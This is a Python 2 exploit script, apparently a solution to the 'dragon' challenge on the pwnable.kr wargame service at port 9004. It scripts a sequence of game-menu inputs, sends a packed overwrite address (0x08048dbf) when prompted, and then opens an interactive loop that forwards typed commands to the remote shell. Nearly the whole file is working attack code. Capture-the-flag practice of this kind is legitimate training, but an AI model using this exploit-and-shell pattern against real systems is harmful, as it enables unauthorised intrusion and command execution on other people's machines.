import socket
import sys
import struct
import fcntl
import time
import os

def read_until(word):
    output= ''
    while word not in output:
        output = s.recv(512)
        sys.stdout.write(output)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('pwnable.kr', 9004))

read_until('Knight')

s.send('2\n')

read_until('Knight')

s.send('2\n')

read_until('Knight')

s.send('1\n')

for i in range(0,4):
    read_until('Priest')
    s.send('3\n')
    read_until('Priest')
    s.send('3\n')
    read_until('Priest')
    s.send('2\n')

read_until('Remember')

s.send(struct.pack('<I', 0x08048dbf)+'\n')


#fd = s.stdout.fileno()
#fl = fcntl.fcntl(fd, fcntl.F_GETFL)
#fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

s.settimeout(0.25)
while(True):
    try:
        print s.recv(512)
    except:
        s.send(raw_input() + '\n')

